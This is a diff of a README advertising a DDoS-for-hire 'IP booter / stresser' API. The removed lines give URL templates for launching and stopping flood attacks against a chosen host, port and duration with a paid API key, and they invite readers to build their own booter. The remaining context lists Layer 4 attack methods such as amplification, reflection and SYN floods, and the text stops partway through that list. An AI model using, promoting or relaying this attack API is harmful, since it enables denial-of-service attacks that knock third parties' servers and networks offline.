@@ -8,17 +8,6 @@ Working DDOS API For [IP Booter](https://nightmarestresser.net/) / [IP Stresser]
 ![api](https://i.imgur.com/FerP3kP.png)
 
 ## Introduction & API Documentation
-
-API is useful if you wish to implement it into your own software or create your own ip booter / ip stresser, allowing you to launch/stop attacks with a simple HTTP GET request, make sure to replace [KEY] with your key and same with method host port and time, time is counted in seconds. Only thing needed to get started is for you to register and get a plan that includes API access to get your API KEY on [nightmarestresser.net](https://nightmarestresser.net/)
-
-
-Send Attack:
-https://api.nightmarestresser.net/?key=[KEY]&method=[METHOD]&host=[HOST]&port=[PORT]&time=[TIME]
-
-
-Stop Attack:
-https://api.nightmarestresser.net/?key=[KEY]&method=STOP&host=[HOST]&port=[PORT]&time=[TIME]
-
 ```sh
   [Layer 4]
   UDP-AMP, SSDP, TCP-AMP, TCP-OVH, TCPBYPASS, TCP-HANDSHAKE, TCP-REFLECT, UDP-BYPASS, UDPBYPASS, TCP-TLS, TCP-RAND, TCP-SYN, 
